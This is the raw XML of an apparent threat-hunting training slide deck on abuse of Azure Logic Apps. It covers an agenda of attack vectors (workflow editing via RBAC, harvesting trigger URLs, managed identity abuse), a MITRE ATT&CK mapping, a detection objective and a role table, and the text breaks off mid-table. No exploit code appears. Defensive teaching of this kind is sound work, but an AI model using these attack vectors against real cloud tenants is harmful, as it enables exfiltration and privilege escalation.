          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="38917683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 Risk manag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46BD20-84B7-474B-8759-CD81E4655A25}"/>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10" name="Picture 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B1DAC3B3-181F-5149-B531-D73282A25D15}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2"/>
          <a:srcRect l="7666" t="4539" r="7270" b="6936"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5270499" y="-1"/>
            <a:ext cx="6921501" cy="6858001"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30955036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 Secure ident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C11EAE-3A22-E84A-8BC8-11A0D824AB2E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5270500" y="0"/>
            <a:ext cx="69215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F1130DED-49F2-7F4A-A1D8-D5BEF2F4F110}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5692066" y="901699"/>
            <a:ext cx="6245934" cy="4735013"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18463857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title - Risk mitiga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0D265D-AA9F-1B4D-9271-7954CC4C5428}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5270500" y="0"/>
            <a:ext cx="6921500" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="054B1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7" name="Graphic 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B55BBCEC-22DB-8F44-AC0C-CED390E2A8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20994511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22498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nk 2">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120309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ank you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Tree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="6385373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ank you phot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5" y="3035808"/>
            <a:ext cx="3948683"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C1D8EF4-A5A1-4D2B-9918-9B027853453F}"/>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1522514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2DB3C5CC-AE72-496D-8E0F-9DEC4A52D5F7}"/>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73270637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9020593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8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16932037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9069C-55C3-A24B-5852-9324D00871E5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Logic App Abuse in Azure</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E8AB03C2-598D-F476-50D0-C83D37920ABA}"/>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079164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8A515-F265-25F5-7902-197E36E98DA3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Agenda</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D044905C-803E-8A40-4AE5-8416779CFB86}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000"/>
              <a:t>Module Objective and MITRE ATT&amp;CK Mapping</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000"/>
              <a:t>Why Logic Apps Are an Attack Target</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000"/>
              <a:t>Attack Vector 1: RBAC Abuse to Edit Workflow Definitions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000"/>
              <a:t>Attack Vector 2: Trigger URL Harvesting (SAS Callback)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000"/>
              <a:t>Attack Vector 3: Managed Identity Abuse</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000"/>
              <a:t>Detection: AzureActivity Key Fields and Operations</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22868944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BCCB7-6A8B-421A-FB2A-37B683CFC53A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Agenda (cont. 2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0BBBB4E7-F76B-742D-DB6C-8E7C14A41B80}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000"/>
              <a:t>Kusto Query Language (KQL) Detection Queries</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000"/>
              <a:t>Investigation Workflow</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000"/>
              <a:t>Incident Response Steps</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000"/>
              <a:t>Hardening Controls</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="354405277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0DD17-2E89-6AC1-9EB6-321CBA105507}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Objective and MITRE Mapping</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4BB49ABF-2431-05DA-D798-8F27BF742B76}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1884028846"/>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1268444237"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3810000">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2070913203"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3810000">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1376569569"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="716643">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1"/>
                        <a:t>Technique</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1"/>
                        <a:t>ID</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1"/>
                        <a:t>Tactic</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3191052470"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="716643">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Serverless Execution</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>T1648</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Execution</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3522109361"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="716643">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Automated Exfiltration</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>T1020</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Exfiltration</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4153976927"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="716643">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Abuse Elevation Control Mechanism</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>T1548</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Privilege Escalation</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3539459103"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="716643">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Scheduled Task/Job</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>T1053</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Persistence</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4061347234"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="716643">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Exfiltration Over Web Service</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>T1567</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Exfiltration</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1354449003"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="716643">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Account Manipulation</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>T1098</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Persistence</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3830298071"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="355573027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2C3D5-8FCF-7EEA-8E83-B700FC885AFB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Objective and MITRE Mapping (cont.)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{488ED5F4-04CA-9644-0B7A-E974137D057B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600"/>
              <a:t>Objective: Hunt for malicious use of Azure Logic Apps including data exfiltration via connectors, privilege escalation through managed identities, and persistence via timer triggers.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="343239819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9A7C7-CA98-34F8-4167-73C034BB3F28}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Why Logic Apps Are an Attack Target</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3ED094A9-FC1C-E2B5-8EB2-157CB2E8A70A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="330986039"/>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192754735"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3810000">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3237484196"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3810000">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="190333445"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="977900">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1"/>
                        <a:t>Role</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1"/>
                        <a:t>Can Edit Workflows?</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1"/>
                        <a:t>Notes</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4197606524"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="977900">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Owner</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Yes</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Full control</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2725323389"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="977900">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Contributor</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Yes</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Most common misconfiguration</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3233313768"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="977900">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Logic App Contributor</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Yes</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
